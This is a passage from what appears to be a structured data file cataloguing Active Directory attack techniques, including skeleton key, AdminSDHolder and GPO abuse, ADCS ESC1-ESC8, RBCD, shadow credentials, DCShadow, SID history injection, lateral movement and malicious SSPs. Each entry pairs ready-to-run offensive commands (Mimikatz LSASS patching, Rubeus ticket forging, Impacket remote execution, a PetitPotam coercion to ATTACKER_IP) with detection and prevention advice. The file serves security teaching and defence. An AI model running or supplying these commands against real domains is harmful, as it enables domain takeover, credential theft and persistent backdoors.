      "Defender for Identity can detect PAC manipulation",
      "Monitoring for unusual group memberships in PAC vs actual AD group membership"
    ],
    mitre: "T1558.001",
    prevention: [
      "Reset krbtgt password twice regularly",
      "Deploy Defender for Identity",
      "Enable PAC validation",
      "Implement Kerberos armoring (FAST)"
    ],
    references: ["https://attack.mitre.org/techniques/T1558/001/"]
  },
  {
    name: "Sapphire Ticket Attack",
    category: "Privilege Escalation",
    description: "Similar to diamond tickets but obtains the PAC of a real high-privilege user via S4U2self+U2U and grafts it onto a new ticket. The PAC is legitimate (from a real admin), making it extremely hard to detect.",
    prerequisites: ["krbtgt AES key", "Valid domain user credentials"],
    commands: [
      "Rubeus.exe diamond /krbkey:AES256KEY /tgtdeleg /enctype:aes /ticketuser:Administrator /ticketuserid:500 /groups:512 /ptt /sapphire",
      "# The sapphire flag modifies Rubeus to use S4U2self+U2U to get a real PAC"
    ],
    tools: ["Rubeus (with sapphire flag)"],
    detection: [
      "S4U2self requests (Event ID 4769 with ticket options indicating S4U)",
      "U2U TGS requests from non-service accounts",
      "Correlation of S4U2self + PAC manipulation",
      "Defender for Identity anomaly detection"
    ],
    mitre: "T1558.001",
    prevention: [
      "Reset krbtgt password twice regularly",
      "Monitor S4U2self requests from workstations",
      "Deploy advanced Kerberos monitoring (Defender for Identity)",
      "Implement Kerberos armoring"
    ],
    references: ["https://attack.mitre.org/techniques/T1558/001/"]
  },
  {
    name: "Skeleton Key Attack",
    category: "Privilege Escalation",
    description: "Patch the LSASS process on a Domain Controller to add a master password that works alongside every user's real password. After injection, 'mimikatz' (or custom password) works as a password for any account.",
    prerequisites: ["Domain Admin access to a DC", "Ability to run code on DC"],
    commands: [
      "mimikatz.exe 'privilege::debug' 'misc::skeleton'",
      "# Default skeleton key password: mimikatz",
      "# After injection, authenticate as any user with password 'mimikatz'",
      "# Persists until DC reboot",
      "# For LSASS protected process, use mimidrv.sys driver:",
      "mimikatz.exe 'privilege::debug' '!+' '!processprotect /process:lsass.exe /remove' 'misc::skeleton'"
    ],
    tools: ["Mimikatz"],
    detection: [
      "Monitor LSASS process for code injection (Sysmon Event ID 8, 10)",
      "Detect unusual DLL loads into LSASS",
      "Event ID 4673 (Sensitive privilege use) for SeDebugPrivilege",
      "EDR detections for LSASS tampering",
      "Authentication succeeding with unusual timing patterns",
      "RunAsPPL bypass detection (mimidrv.sys driver load)"
    ],
    mitre: "T1556.001",
    prevention: [
      "Enable RunAsPPL for LSASS (Credential Guard)",
      "Enable Credential Guard on DCs",
      "Monitor LSASS integrity with Sysmon",
      "Deploy EDR with LSASS protection",
      "Restrict who can log on to DCs",
      "Regular DC reboots (skeleton key doesn't persist)"
    ],
    references: ["https://attack.mitre.org/techniques/T1556/001/"]
  },
  {
    name: "AdminSDHolder Abuse",
    category: "Privilege Escalation",
    description: "Modify the ACL on the AdminSDHolder container. Every 60 minutes, the SDProp process copies AdminSDHolder's ACL to all protected groups (Domain Admins, Enterprise Admins, etc.). Gives persistent backdoor access.",
    prerequisites: ["Write access to AdminSDHolder container (Domain Admin or equivalent)"],
    commands: [
      "# Add full control for attacker to AdminSDHolder",
      "Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=domain,DC=com' -PrincipalIdentity attacker -Rights All",
      "# Using dsacls:",
      "dsacls 'CN=AdminSDHolder,CN=System,DC=domain,DC=com' /G 'domain\\attacker:GA'",
      "# After 60 minutes (or force SDProp), attacker gets full control over all protected groups",
      "# Force SDProp manually:",
      "Invoke-ADSDPropagation",
      "# Check AdminSDHolder ACL:",
      "Get-DomainObjectAcl 'CN=AdminSDHolder,CN=System,DC=domain,DC=com' -ResolveGUIDs | ? {$_.SecurityIdentifier -match 'S-1-5-21'}"
    ],
    tools: ["PowerView", "dsacls", "ADExplorer", "RSAT"],
    detection: [
      "Event ID 5136 (directory service object modified) on AdminSDHolder",
      "Event ID 4662 on AdminSDHolder with write access",
      "Monitor ACL changes on CN=AdminSDHolder,CN=System",
      "Regular auditing of AdminSDHolder ACL for unauthorized entries",
      "SDProp propagation applying unexpected ACEs to protected groups"
    ],
    mitre: "T1484.001",
    prevention: [
      "Monitor AdminSDHolder ACL changes with alerts",
      "Regular audit of AdminSDHolder ACL",
      "Restrict who can modify AdminSDHolder",
      "Use privileged access management to control DA access",
      "Implement tiered administration"
    ],
    references: ["https://attack.mitre.org/techniques/T1484/001/"]
  },
  {
    name: "GPO Abuse",
    category: "Privilege Escalation",
    description: "Modify Group Policy Objects to push malicious configurations, scripts, or scheduled tasks to domain-joined machines. If an attacker can write to a GPO linked to OUs containing computers or users, they can execute code domain-wide.",
    prerequisites: ["Write access to a GPO (GPC object in AD or GPT files in SYSVOL)", "GPO must be linked to an OU containing target computers/users"],
    commands: [
      "# Find GPOs writable by current user:",
      "Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match 'WriteProperty|WriteDacl|WriteOwner|GenericAll|GenericWrite'}",
      "# SharpGPOAbuse — add scheduled task:",
      "SharpGPOAbuse.exe --AddComputerTask --TaskName 'Update' --Author 'NT AUTHORITY\\SYSTEM' --Command 'cmd.exe' --Arguments '/c net localgroup administrators attacker /add' --GPOName 'Vulnerable GPO'",
      "# SharpGPOAbuse — add immediate scheduled task:",
      "SharpGPOAbuse.exe --AddComputerTask --TaskName 'Update' --Author 'NT AUTHORITY\\SYSTEM' --Command 'cmd.exe' --Arguments '/c powershell -ep bypass -c IEX(...)' --GPOName 'Vulnerable GPO' --force",
      "# Add user to local admins via GPO:",
      "SharpGPOAbuse.exe --AddLocalAdmin --UserAccount attacker --GPOName 'Vulnerable GPO'",
      "# pyGPOAbuse (Linux):",
      "pygpoabuse.py domain.com/user:pass -gpo-id 'GPO-GUID' -command 'net localgroup administrators attacker /add' -f"
    ],
    tools: ["SharpGPOAbuse", "pyGPOAbuse", "PowerView", "BloodHound", "RSAT"],
    detection: [
      "Event ID 5136 on Group Policy objects",
      "Event ID 5145 for SYSVOL write access",
      "Monitor GPO modification events (Event ID 4739)",
      "File system auditing on SYSVOL GPO folders",
      "BloodHound — check for non-admin users with GPO write permissions"
    ],
    mitre: "T1484.001",
    prevention: [
      "Audit GPO permissions regularly",
      "Remove unnecessary write access to GPOs",
      "Monitor SYSVOL for unauthorized changes",
      "Use GPO versioning and backup for change detection",
      "Implement AGPM (Advanced Group Policy Management) for change control"
    ],
    references: ["https://attack.mitre.org/techniques/T1484/001/"]
  },
  {
    name: "LAPS Password Extraction",
    category: "Privilege Escalation",
    description: "Read LAPS-managed local admin passwords from Active Directory. LAPS stores the password in the ms-Mcs-AdmPwd (legacy) or msLAPS-Password (Windows LAPS) attribute on computer objects. Access requires specific read permissions.",
    prerequisites: ["Read access to ms-Mcs-AdmPwd or msLAPS-Password attribute on target computer objects"],
    commands: [
      "# Legacy LAPS:",
      "Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime | Select Name,ms-Mcs-AdmPwd",
      "Get-DomainComputer -Properties ms-mcs-admpwd | Where-Object {$_.'ms-mcs-admpwd' -ne $null} | Select name,ms-mcs-admpwd",
      "crackmapexec ldap DC_IP -u user -p pass --module laps",
      "laps.py domain.com/user:pass -dc-ip DC_IP",
      "# Windows LAPS:",
      "Get-LapsADPassword -Identity target-pc -AsPlainText",
      "Get-ADComputer -Filter * -Properties msLAPS-Password,msLAPS-EncryptedPassword",
      "# Check who can read LAPS passwords:",
      "Find-AdmPwdExtendedRights -Identity 'Target OU'",
      "Get-DomainObjectAcl -Identity 'CN=target-pc,OU=Workstations,DC=domain,DC=com' -ResolveGUIDs | ? {$_.ObjectAceType -match 'ms-Mcs-AdmPwd'}"
    ],
    tools: ["PowerView", "CrackMapExec", "LAPSToolkit", "Impacket laps.py", "RSAT LAPS module"],
    detection: [
      "Event ID 4662 with access to ms-Mcs-AdmPwd attribute",
      "Monitor LDAP queries for ms-Mcs-AdmPwd attribute reads",
      "Alert on non-authorized LAPS password reads",
      "Audit LAPS read permission assignments"
    ],
    mitre: "T1552.006",
    prevention: [
      "Restrict LAPS read permissions to authorized admin groups only",
      "Use Windows LAPS with password encryption (encrypts to specified security group)",
      "Audit who has LAPS read permissions regularly",
      "Implement tiered administration for LAPS access",
      "Rotate LAPS passwords after use (Set-LapsADPasswordExpirationTime)"
    ],
    references: ["https://attack.mitre.org/techniques/T1552/006/"]
  },
  {
    name: "Certificate Abuse (ADCS ESC1-ESC8)",
    category: "Privilege Escalation",
    description: "Abuse Active Directory Certificate Services (ADCS) misconfigurations to escalate privileges. ESC1-ESC8 are distinct attack paths ranging from template misconfigs to NTLM relay to ADCS endpoints.",
    prerequisites: ["Varies by ESC: domain user (ESC1), CA officer (ESC7), or NTLM relay position (ESC8)"],
    commands: [
      "# Enumerate vulnerable templates:",
      "Certify.exe find /vulnerable",
      "certipy find -u user@domain.com -p pass -dc-ip DC_IP -vulnerable",
      "",
      "# ESC1 — Misconfigured Certificate Templates (enrollee supplies SAN):",
      "Certify.exe request /ca:CA_NAME /template:VulnTemplate /altname:administrator",
      "certipy req -u user@domain.com -p pass -ca CA_NAME -template VulnTemplate -upn administrator@domain.com",
      "",
      "# ESC2 — Any Purpose or SubCA template:",
      "Certify.exe request /ca:CA_NAME /template:SubCA",
      "",
      "# ESC3 — Enrollment agent template abuse:",
      "Certify.exe request /ca:CA_NAME /template:EnrollmentAgent",
      "Certify.exe request /ca:CA_NAME /template:User /onbehalfof:domain\\administrator /enrollcert:agent.pfx",
      "",
      "# ESC4 — Vulnerable template ACL (modify template):",
      "# Modify template to enable ESC1 conditions then exploit",
      "",
      "# ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 flag on CA:",
      "Certify.exe request /ca:CA_NAME /template:User /altname:administrator",
      "",
      "# ESC7 — Vulnerable CA ACL (ManageCA/ManageCertificates):",
      "certipy ca -ca CA_NAME -add-officer attacker -u attacker@domain.com -p pass",
      "certipy ca -ca CA_NAME -enable-template SubCA -u attacker@domain.com -p pass",
      "",
      "# ESC8 — NTLM relay to ADCS HTTP enrollment:",
      "ntlmrelayx.py -t http://ADCS_IP/certsrv/certfnsh.asp --adcs --template DomainController",
      "PetitPotam.py ATTACKER_IP DC_IP",
      "",
      "# Authenticate with certificate:",
      "certipy auth -pfx admin.pfx -dc-ip DC_IP",
      "Rubeus.exe asktgt /user:administrator /certificate:admin.pfx /ptt"
    ],
    tools: ["Certify", "Certipy", "ForgeCert", "Impacket ntlmrelayx", "PetitPotam", "Rubeus"],
    detection: [
      "Event ID 4886 (Certificate request received) with unusual SAN",
      "Event ID 4887 (Certificate approved and issued) — monitor template usage",
      "Event ID 4888 (Certificate Services denied request)",
      "Monitor certificate enrollment with SAN different from requester",
      "Monitor certificate template ACL changes (Event ID 4899, 4900)",
      "Monitor CA configuration changes (Event ID 4890)",
      "Detect NTLM authentication to ADCS HTTP endpoints from non-standard sources"
    ],
    mitre: "T1649",
    prevention: [
      "Audit certificate templates: remove CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT from templates",
      "Require CA certificate manager approval for sensitive templates",
      "Remove enrollment permissions for unnecessary users/groups",
      "Remove EDITF_ATTRIBUTESUBJECTALTNAME2 flag from CA: certutil -config 'CA_NAME' -setreg policy\\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2",
      "Enable Extended Protection for Authentication on ADCS IIS",
      "Restrict ManageCA and ManageCertificates permissions",
      "Disable HTTP enrollment or enforce HTTPS with EPA",
      "Use certificate-based authentication monitoring"
    ],
    references: ["https://posts.specterops.io/certified-pre-owned-d95910965cd2"]
  },
  {
    name: "Constrained Delegation Abuse",
    category: "Privilege Escalation",
    description: "Abuse Kerberos constrained delegation to impersonate any user to the delegated service. If an account is trusted for delegation to a specific SPN, the attacker can request service tickets for any user to that SPN.",
    prerequisites: ["Control of an account with constrained delegation configured", "Credentials or TGT of the delegated account"],
    commands: [
      "# Find accounts with constrained delegation:",
      "Get-DomainUser -TrustedToAuth | Select samaccountname,msds-allowedtodelegateto",
      "Get-DomainComputer -TrustedToAuth | Select name,msds-allowedtodelegateto",
      "",
      "# S4U2self + S4U2proxy to get ticket as admin to delegated service:",
      "Rubeus.exe s4u /user:svc_sql /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/target.domain.com /ptt",
      "Rubeus.exe s4u /user:svc_sql /aes256:KEY /impersonateuser:Administrator /msdsspn:cifs/target.domain.com /altservice:ldap,http,host /ptt",
      "getST.py domain.com/svc_sql:pass -spn cifs/target.domain.com -impersonate Administrator -dc-ip DC_IP",
      "",
      "# Alternative SPN (service name is not validated by default):",
      "Rubeus.exe s4u /user:svc_sql /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/target.domain.com /altservice:ldap /ptt"
    ],
    tools: ["Rubeus", "Impacket getST", "PowerView"],
    detection: [
      "Event ID 4769 with S4U delegation flags",
      "TGS requests with the forwardable flag from constrained delegation accounts",
      "Anomalous service ticket requests from delegation accounts for high-privilege users",
      "Monitor msds-allowedtodelegateto changes (Event ID 5136)"
    ],
    mitre: "T1550.003",
    prevention: [
      "Use Resource-Based Constrained Delegation instead",
      "Add sensitive accounts to Protected Users group (blocks delegation)",
      "Flag sensitive accounts as 'Account is sensitive and cannot be delegated'",
      "Minimize the number of accounts with constrained delegation",
      "Audit delegation configurations regularly"
    ],
    references: ["https://attack.mitre.org/techniques/T1550/003/"]
  },
  {
    name: "Resource-Based Constrained Delegation (RBCD)",
    category: "Privilege Escalation",
    description: "Abuse the msDS-AllowedToActOnBehalfOfOtherIdentity attribute to configure delegation from an attacker-controlled account. Unlike traditional constrained delegation, the target controls who can delegate, making it abusable with write access to computer objects.",
    prerequisites: ["Write access to a computer object's msDS-AllowedToActOnBehalfOfOtherIdentity attribute", "Control of a computer account (MachineAccountQuota > 0 allows creating one)"],
    commands: [
      "# Step 1: Create a computer account (if needed):",
      "addcomputer.py domain.com/user:pass -computer-name FAKE01$ -computer-pass 'Password123!'",
      "New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString 'Password123!' -AsPlainText -Force)",
      "",
      "# Step 2: Set RBCD on target computer:",
      "rbcd.py domain.com/user:pass -delegate-to TARGET$ -delegate-from FAKE01$ -dc-ip DC_IP -action write",
      "Set-ADComputer TARGET$ -PrincipalsAllowedToDelegateToAccount FAKE01$",
      "",
      "# Step 3: S4U to get ticket as admin:",
      "getST.py domain.com/FAKE01$:'Password123!' -spn cifs/TARGET.domain.com -impersonate Administrator -dc-ip DC_IP",
      "Rubeus.exe s4u /user:FAKE01$ /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/TARGET.domain.com /ptt",
      "",
      "# Step 4: Use the ticket:",
      "export KRB5CCNAME=Administrator.ccache",
      "psexec.py domain.com/Administrator@TARGET -k -no-pass"
    ],
    tools: ["Impacket (rbcd.py, getST.py, addcomputer.py)", "Rubeus", "PowerView", "StandIn"],
    detection: [
      "Event ID 5136 for modification of msDS-AllowedToActOnBehalfOfOtherIdentity",
      "Event ID 4741 (computer account created) — MachineAccountQuota abuse",
      "Event ID 4769 with S4U delegation flags from newly created computer accounts",
      "Monitor for new computer accounts created by non-admin users"
    ],
    mitre: "T1550.003",
    prevention: [
      "Set MachineAccountQuota to 0 (default is 10)",
      "Monitor msDS-AllowedToActOnBehalfOfOtherIdentity changes",
      "Restrict who can write to computer objects",
      "Use Protected Users group for sensitive accounts",
      "Regular audit of RBCD configurations"
    ],
    references: ["https://attack.mitre.org/techniques/T1550/003/"]
  },
  {
    name: "Shadow Credentials",
    category: "Privilege Escalation",
    description: "Add a Key Credential to a target account's msDS-KeyCredentialLink attribute. This allows PKINIT pre-authentication with the corresponding private key, yielding a TGT and the account's NTLM hash via UnPAC-the-Hash.",
    prerequisites: ["Write access to the target's msDS-KeyCredentialLink attribute", "ADCS or WHfB (Windows Hello for Business) configured — Key Trust model"],
    commands: [
      "# Add shadow credential:",
      "Whisker.exe add /target:TARGET$ /domain:domain.com /dc:dc01.domain.com",
      "certipy shadow auto -u user@domain.com -p pass -account TARGET$",
      "pywhisker.py -d domain.com -u user -p pass --target TARGET$ --action add",
      "",
      "# Authenticate with the shadow credential:",
      "Rubeus.exe asktgt /user:TARGET$ /certificate:cert.pfx /password:password /ptt",
      "certipy auth -pfx cert.pfx -dc-ip DC_IP",
      "",
      "# Get NTLM hash via UnPAC-the-Hash:",
      "Rubeus.exe asktgt /user:TARGET$ /certificate:cert.pfx /password:password /getcredentials",
      "",
      "# Clean up:",
      "Whisker.exe remove /target:TARGET$ /deviceid:GUID",
      "pywhisker.py -d domain.com -u user -p pass --target TARGET$ --action remove --device-id GUID"
    ],
    tools: ["Whisker", "pywhisker", "Certipy", "Rubeus", "DSInternals"],
    detection: [
      "Event ID 5136 for modification of msDS-KeyCredentialLink attribute",
      "Event ID 4768 with pre-authentication type PKINIT from unexpected sources",
      "Monitor msDS-KeyCredentialLink changes on sensitive accounts",
      "Anomalous certificate-based authentication from accounts not using WHfB"
    ],
    mitre: "T1556.006",
    prevention: [
      "Monitor msDS-KeyCredentialLink modifications",
      "Restrict write access to computer and user objects",
      "Audit Key Credential Link changes via Event ID 5136",
      "Implement strict WHfB enrollment policies",
      "Regular cleanup of stale key credentials"
    ],
    references: ["https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab"]
  },
  {
    name: "DCShadow Attack",
    category: "Privilege Escalation",
    description: "Register a rogue DC in Active Directory and push malicious changes via AD replication. Changes bypass normal auditing because they appear as replication events. Can modify any object attributes, ACLs, or SID history.",
    prerequisites: ["Domain Admin or equivalent privileges", "Ability to register SPN for directory replication service"],
    commands: [
      "# Terminal 1 — start the rogue DC (requires SYSTEM):",
      "mimikatz.exe 'lsadump::dcshadow /object:targetuser /attribute:SIDHistory /value:S-1-5-21-xxx-500'",
      "mimikatz.exe 'lsadump::dcshadow /object:targetuser /attribute:primaryGroupID /value:512'",
      "",
      "# Terminal 2 — push the replication:",
      "mimikatz.exe 'lsadump::dcshadow /push'",
      "",
      "# Add full control ACE via DCShadow:",
      "mimikatz.exe 'lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=domain,DC=com /attribute:nTSecurityDescriptor /value:...'",
      "",
      "# Modify computer object for RBCD:",
      "mimikatz.exe 'lsadump::dcshadow /object:TARGET$ /attribute:msDS-AllowedToActOnBehalfOfOtherIdentity /value:...'"
    ],
    tools: ["Mimikatz (lsadump::dcshadow)"],
    detection: [
      "Event ID 4742 on DCs — new SPN registered for replication (E3514235-xxx GUID)",
      "Event ID 4929 (AD replication source removed) from unexpected sources",
      "Monitor for new nTDSDSA objects in CN=Sites,CN=Configuration",
      "Network monitoring for DRS RPC traffic from non-DC sources",
      "Defender for Identity detects DCShadow attempts"
    ],
    mitre: "T1207",
    prevention: [
      "Deploy Defender for Identity for DCShadow detection",
      "Monitor nTDSDSA object creation",
      "Monitor SPN registration for replication service GUIDs",
      "Restrict who can register SPNs and modify AD schema",
      "Enable and monitor AD replication metadata"
    ],
    references: ["https://attack.mitre.org/techniques/T1207/"]
  },

  // ===== LATERAL MOVEMENT =====
  {
    name: "PsExec / SMB Lateral Movement",
    category: "Lateral Movement",
    description: "Execute commands on remote systems via SMB using various methods: Sysinternals PsExec (uploads service binary), Impacket psexec (uploads service binary), smbexec (uses cmd.exe shares), atexec (uses Task Scheduler).",
    prerequisites: ["Admin credentials or hash for target", "SMB (port 445) accessible", "Admin$ or C$ share accessible"],
    commands: [
      "psexec.exe \\\\TARGET -u domain\\admin -p pass cmd.exe",
      "psexec.py domain.com/admin:pass@TARGET",
      "psexec.py domain.com/admin@TARGET -hashes :HASH",
      "smbexec.py domain.com/admin:pass@TARGET",
      "wmiexec.py domain.com/admin:pass@TARGET",
      "atexec.py domain.com/admin:pass@TARGET 'whoami'",
      "dcomexec.py domain.com/admin:pass@TARGET",
      "crackmapexec smb TARGET -u admin -p pass -x 'whoami'",
      "crackmapexec smb TARGET -u admin -H HASH -x 'whoami'"
    ],
    tools: ["Impacket", "CrackMapExec/NetExec", "Sysinternals PsExec", "Metasploit psexec modules"],
    detection: [
      "Event ID 7045 (Service installed) — PsExec creates PSEXESVC service",
      "Event ID 4624 Type 3 (Network logon) from lateral movement source",
      "Event ID 4697 (Service installed in the system)",
      "Sysmon Event ID 1 — process creation from service binary",
      "Named pipe creation on IPC$ share (\\\\pipe\\svcctl)",
      "SMB file write to ADMIN$ share",
      "Unusual parent-child process relationships (services.exe → cmd.exe)"
    ],
    mitre: "T1021.002, T1569.002",
    prevention: [
      "Restrict local admin access via LAPS and tiered administration",
      "Enable SMB signing to prevent relay",
      "Restrict Admin$/C$ share access",
      "Deploy EDR with lateral movement detection",
      "Use Windows Firewall to block unnecessary SMB between workstations",
      "Implement network segmentation"
    ],
    references: ["https://attack.mitre.org/techniques/T1021/002/"]
  },
  {
    name: "WMI Lateral Movement",
    category: "Lateral Movement",
    description: "Execute commands on remote systems using Windows Management Instrumentation (WMI). Uses DCOM (port 135 + dynamic) or WinRM. Semi-fileless as it doesn't write binaries to disk by default.",
    prerequisites: ["Admin credentials for target", "WMI (DCOM port 135) or WinRM (5985/5986) accessible"],
    commands: [
      "wmiexec.py domain.com/admin:pass@TARGET",
      "wmiexec.py domain.com/admin@TARGET -hashes :HASH",
      "wmic /node:TARGET /user:admin /password:pass process call create 'cmd.exe /c whoami > C:\\temp\\out.txt'",
      "Invoke-WmiMethod -ComputerName TARGET -Class Win32_Process -Name Create -ArgumentList 'cmd.exe /c whoami'",
      "Get-WmiObject -Class Win32_Process -ComputerName TARGET -Credential $cred",
      "crackmapexec smb TARGET -u admin -p pass --exec-method wmiexec -x 'whoami'"
    ],
    tools: ["Impacket wmiexec", "CrackMapExec", "wmic", "PowerShell WMI cmdlets"],
    detection: [
      "Event ID 4624 Type 3 followed by WMI activity",
      "Event ID 4648 (Explicit credential logon) for WMI connections",
      "Sysmon Event ID 1 with WmiPrvSE.exe as parent process",
      "WMI event subscriptions (permanent consumers) for persistence",
      "Network monitoring for DCOM/RPC traffic on port 135"
    ],
    mitre: "T1021.006, T1047",
    prevention: [
      "Restrict WMI access via DCOM permissions",
      "Use Windows Firewall to block WMI/DCOM between workstations",
      "Deploy EDR with WMI monitoring",
      "Implement network segmentation",
      "Restrict local admin privileges"
    ],
    references: ["https://attack.mitre.org/techniques/T1047/"]
  },
  {
    name: "WinRM / PowerShell Remoting",
    category: "Lateral Movement",
    description: "Execute commands on remote systems using WinRM (Windows Remote Management) over HTTP/HTTPS (ports 5985/5986). PowerShell remoting uses WinRM as its transport. Can use interactive sessions (Enter-PSSession) or batch commands (Invoke-Command).",
    prerequisites: ["Admin credentials for target", "WinRM enabled (default on servers, not workstations)", "Port 5985 (HTTP) or 5986 (HTTPS)"],
    commands: [
      "evil-winrm -i TARGET -u admin -p pass",
      "evil-winrm -i TARGET -u admin -H HASH",
      "Enter-PSSession -ComputerName TARGET -Credential $cred",
      "Invoke-Command -ComputerName TARGET -Credential $cred -ScriptBlock { whoami }",
      "Invoke-Command -ComputerName TARGET1,TARGET2 -Credential $cred -FilePath script.ps1",
      "crackmapexec winrm TARGET -u admin -p pass -x 'whoami'",
      "# Enable WinRM on target (if admin):",
      "winrm quickconfig -force",
      "Enable-PSRemoting -Force"
    ],
    tools: ["evil-winrm", "PowerShell PSRemoting", "CrackMapExec", "pywinrm"],
    detection: [
      "Event ID 4624 Type 3 on WinRM port (5985/5986)",
      "Event ID 91/168 (WSMan/WinRM operational logs)",
      "PowerShell Event ID 4103/4104 for remote commands",
      "Event ID 400/403 (PowerShell engine start/stop)",
      "Network monitoring for HTTP traffic on port 5985/5986"
    ],
    mitre: "T1021.006",
    prevention: [
      "Disable WinRM on workstations where not needed",
      "Use JEA (Just Enough Administration) to restrict commands",
      "Restrict WinRM access via Windows Firewall",
      "Enable PowerShell ScriptBlock and Module logging",
      "Use certificate-based authentication for WinRM",
      "Implement network segmentation"
    ],
    references: ["https://attack.mitre.org/techniques/T1021/006/"]
  },

  // ===== PERSISTENCE =====
  {
    name: "SID History Injection",
    category: "Persistence",
    description: "Add a privileged SID (like Domain Admin SID) to the SID history attribute of a controlled account. The account then receives the privileges of both its own SID and the injected SID in all access tokens.",
    prerequisites: ["Domain Admin access (or DCSync/DCShadow capabilities)"],
    commands: [
      "# Using Mimikatz (requires SYSTEM on DC):",
      "mimikatz.exe 'privilege::debug' 'sid::add /sam:attacker /new:S-1-5-21-xxx-512'",
      "mimikatz.exe 'sid::modify /sam:attacker /new:administrator'",
      "",
      "# Using DCShadow to add SID history:",
      "mimikatz.exe 'lsadump::dcshadow /object:attacker /attribute:SIDHistory /value:S-1-5-21-xxx-512'",
      "",
      "# Check SID history:",
      "Get-ADUser attacker -Properties SIDHistory | Select SIDHistory",
      "Get-DomainUser attacker -Properties objectsid,sidhistory"
    ],
    tools: ["Mimikatz", "DSInternals"],
    detection: [
      "Event ID 4765 (SID History was added to an account)",
      "Event ID 4766 (attempt to add SID History failed)",
      "Monitor sIDHistory attribute changes (Event ID 5136)",
      "Accounts with SID history containing privileged SIDs",
      "Token analysis showing unexpected SIDs in access tokens"
    ],
    mitre: "T1134.005",
    prevention: [
      "Enable SID Filtering on trusts (blocks SID history across trust boundaries)",
      "Monitor and alert on SID History modifications",
      "Regular audit of accounts with populated SID History",
      "Restrict who can modify SID History attributes",
      "Enable Defender for Identity for SID history injection detection"
    ],
    references: ["https://attack.mitre.org/techniques/T1134/005/"]
  },
  {
    name: "Security Descriptor Modification",
    category: "Persistence",
    description: "Modify the DACL (Discretionary Access Control List) on AD objects to grant a controlled account persistent access. Can grant DCSync rights, GenericAll on OUs, or WriteDacl on the domain root.",
    prerequisites: ["WriteDacl or Full Control on target AD objects"],
    commands: [
      "# Grant DCSync rights to an attacker account:",
      "Add-DomainObjectAcl -TargetIdentity 'DC=domain,DC=com' -PrincipalIdentity attacker -Rights DCSync",
      "",
      "# Grant full control on a user:",
      "Add-DomainObjectAcl -TargetIdentity targetuser -PrincipalIdentity attacker -Rights All",
      "",
      "# Grant WriteDacl on domain root:",
      "Add-DomainObjectAcl -TargetIdentity 'DC=domain,DC=com' -PrincipalIdentity attacker -Rights WriteDacl",
      "",
      "# Using dsacls:",
      "dsacls 'DC=domain,DC=com' /G 'domain\\attacker:CA;Replicating Directory Changes;'",
      "dsacls 'DC=domain,DC=com' /G 'domain\\attacker:CA;Replicating Directory Changes All;'",
      "",
      "# Check ACLs:",
      "Get-DomainObjectAcl -Identity 'DC=domain,DC=com' -ResolveGUIDs | ? {$_.SecurityIdentifier -match 'attacker-SID'}",
      "Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.IdentityReferenceName -eq 'attacker'}"
    ],
    tools: ["PowerView", "dsacls", "BloodHound", "ADExplorer"],
    detection: [
      "Event ID 5136 (directory object modified) for nTSecurityDescriptor changes",
      "Event ID 4662 with WriteDacl access on domain root or sensitive objects",
      "BloodHound queries for non-standard DCSync rights",
      "Regular ACL auditing and comparison against baseline"
    ],
    mitre: "T1222.001",
    prevention: [
      "Monitor DACL changes on sensitive AD objects",
      "Implement baseline ACL auditing",
      "Restrict WriteDacl permissions",
      "Use AdminSDHolder to protect sensitive objects",
      "Deploy ACL change alerting"
    ],
    references: ["https://attack.mitre.org/techniques/T1222/001/"]
  },
  {
    name: "Custom Security Support Provider (SSP)",
    category: "Persistence",
    description: "Register a malicious SSP DLL on a Domain Controller. The SSP hooks into the authentication process and captures plaintext credentials for every logon event. Persists across reboots if registered in the registry.",
    prerequisites: ["Local admin/SYSTEM access on target (DC for maximum impact)"],
    commands: [
      "# Mimikatz — inject SSP into LSASS (non-persistent, lost on reboot):",
      "mimikatz.exe 'privilege::debug' 'misc::memssp'",
      "# Credentials logged to C:\\Windows\\System32\\mimilsa.log",
      "",
      "# Persistent — register SSP DLL via registry:",
      "# Copy mimilib.dll to C:\\Windows\\System32\\",
      "reg add 'HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa' /v 'Security Packages' /t REG_MULTI_SZ /d 'kerberos\\0msv1_0\\0schannel\\0wdigest\\0tspkg\\0pku2u\\0mimilib' /f",
      "# Requires reboot to take effect",
      "",
      "# AddSecurityPackage API (persistent without reboot):",
      "# Use custom tool to call AddSecurityPackageW()"
    ],
    tools: ["Mimikatz (misc::memssp, mimilib.dll)"],
    detection: [
      "Monitor LSA Security Packages registry key for changes",
      "Event ID 4657 (registry value modified) on Security Packages",
      "Sysmon Event ID 7 (DLL loaded) in LSASS for unknown DLLs",
      "Monitor C:\\Windows\\System32 for new DLLs",
      "EDR monitoring of LSASS process for injected modules"
    ],
    mitre: "T1547.005",
    prevention: [
      "Enable RunAsPPL for LSASS",
      "Enable Credential Guard",
      "Monitor registry changes on Security Packages",
      "Use application whitelisting for System32",
      "Restrict local admin access on DCs"
    ],
    references: ["https://attack.mitre.org/techniques/T1547/005/"]
  },
  {
    name: "Machine Account Quota Abuse",
    category: "Persistence",
    description: "Domain users can create up to 10 computer accounts by default (ms-DS-MachineAccountQuota). Attacker-created machine accounts have known credentials and persist independently of compromised user accounts.",
    prerequisites: ["Any domain user account", "MachineAccountQuota > 0 (default: 10)"],
    commands: [
      "# Check current quota:",
      "Get-ADObject 'DC=domain,DC=com' -Properties ms-DS-MachineAccountQuota",
      "crackmapexec ldap DC_IP -u user -p pass -M maq",
      "",
      "# Create machine account:",
      "addcomputer.py domain.com/user:pass -computer-name FAKE01$ -computer-pass 'Password123!'",
      "New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString 'Password123!' -AsPlainText -Force)",
      "StandIn.exe --computer FAKE01 --make",
      "",
      "# Use for RBCD, silver tickets, or as persistent foothold:",
